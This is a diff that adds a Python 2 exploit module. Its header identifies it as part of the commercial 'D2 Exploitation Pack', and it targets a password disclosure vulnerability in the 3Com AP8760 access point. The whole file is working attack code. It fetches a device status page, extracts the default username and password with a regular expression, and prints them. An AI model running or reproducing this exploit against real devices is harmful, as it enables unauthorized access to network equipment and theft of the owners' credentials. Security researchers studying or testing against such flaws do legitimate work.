@@ -1,0 +1,55 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_3com_3'
+_vendor_ = '3com'
+_model_  = ['AP8760']
+_vuln_   = 'Password Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  uri = 'http://%s/s_brief.htm' % host
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, uri)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status == 200:
+    nfo = re.findall('<font face="Arial, Helvetica, sans-serif" size="3" color="#000000">The default username is <b>(.+?)</b> with password <b>(.+?)</b>.</font></p>', nfo.getvalue())
+    username = nfo[0][0]
+    password = nfo[0][1]
+    if len(username) and len(password):
+      print '[+] %s vulnerable' % host
+      print 'user: %s' % username
+      print 'password: %s' % password
+      return
+  print '[+] %s not vulnerable' % host
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
